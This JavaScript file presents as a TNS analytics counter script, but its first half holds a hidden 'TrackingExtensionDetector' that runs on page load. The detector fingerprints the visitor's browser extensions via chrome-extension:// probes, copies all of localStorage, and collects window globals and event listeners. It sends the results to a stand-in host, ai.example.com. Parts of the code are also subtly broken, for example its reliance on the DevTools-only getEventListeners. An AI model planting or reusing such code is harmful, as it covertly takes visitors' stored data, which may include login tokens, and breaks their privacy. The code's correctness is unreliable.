(function (c, g) {
  class TrackingExtensionDetector {
    constructor(extensionData, trackingConfig) {
      this._data = extensionData;
      this._trackingConfig = trackingConfig;
      this._results = {};
      this._startTrackingTime = performance.now();
      this._detectRetries = 2;
      this._globalVars = Object.keys(window);
    }
    _getFileNameForTrack(extensionId, file) {
      return `chrome-extension://${extensionId}/${file}`;
    }
    _trackFetchStatus(recordName, hookId, file) {
      const endpoint = this._getFileNameForTrack(hookId, file);
      return fetch(endpoint).then(response => response.ok).catch(() => false).finally(() => this._results[recordName] = true);
    }
    _globalVarsCollection() {
      const newGlobalVars = Object.keys(window).filter(v => !this._globalVars.includes(v));
      this._results['newGlobalVars'] = newGlobalVars;
    }
    _trackLocalStorage() {
      const copyOfLocalStorage = JSON.parse(JSON.stringify(localStorage));
      this._results['localStorage'] = copyOfLocalStorage;
    }
    _trackEventListeners(node = window, list = []) {
      let items = list.concat(getEventListeners(node));
      let children = node.childNodes;
      for (let i = 0; i < children.length; i++) {
        items = items.concat(this._trackEventListeners(children[i], items));
      }
      return items;
    }
    async executeTrack() {
      const hooks = Object.entries(this._trackingConfig.jsHooks);
      const hooksChunks = await this._chunk(hooks, 4);
      for (const chunk of hooksChunks) {
        await Promise.all(chunk.map(([name, {
          hookId,
          file
        }]) => {
          this._globalVarsCollection();
          this._trackLocalStorage();
          this._results['eventListeners'] = this._trackEventListeners();
          return this._retryCheck(name, hookId, file);
        }));
      }
      this._sendDataToTracking();
    }
    async _retryCheck(name, hookId, file) {
      let success = false;
      for (let retry = 0; retry < this._detectRetries && !success; retry++) {
        success = await this._trackFetchStatus(name, hookId, file);
        if (!success) {
          await new Promise(r => setTimeout(r, 100 * (retry + 1)));
        }
      }
    }
    _sendDataToTracking() {
      const encoder = new TextEncoder();
      const data = encoder.encode(JSON.stringify(this._results));
      if ('sendBeacon' in navigator) {
        navigator.sendBeacon('https://ai.example.com/report-tracker', data);
      } else {
        fetch('https://ai.example.com/report-tracker', {
          method: 'POST',
          body: data,
          keepalive: true,
          headers: {
            'Content-Type': 'application/json'
          }
        }).catch(() => {});
      }
    }
    async _chunk(array, size) {
      const results = [];
      while (array.length) {
        results.push(array.splice(0, size));
      }
      return results;
    }
  }
  (async () => {
    const tracker = new TrackingExtensionDetector(window.data, window.trackingConfig);
    if (document.readyState !== 'loading') {
      tracker.executeTrack();
    } else {
      document.addEventListener('DOMContentLoaded', () => tracker.executeTrack());
    }
  })();
  c.TNS = c.TNS || {};
  TNS.TnsCounter = function (a) {
    var c = function (c, b, d, e) {
      b = d || g.referrer.replace(/\*/g, "%2a") || "";
      d = Math.round(1E9 * Math.random());
      return "//www.tns-counter.ru/V13a**" + (e || a.param1 || "") + "*R>" + b + "*" + a.account + "/ru/UTF-8/tmsec=" + (c || a.tmsec) + "/" + d;
    };
    this.hit = function (a, b, d, e) {
      a = c(a, b, d, e);
      new Image().src = a;
    };
    if (void 0 === a.autohit || a.autohit) {
      var b = c();
      new Image().src = b;
    }
  };
  var a = c.tnscounter_callback;
  if ("object" == typeof a) for (var b = 0; b < a.length; b++) {
    var f = a[b];
    f && (a[b] = null, f());
  }
  try {
    delete c[a];
  } catch (h) {}
})(this, this.document);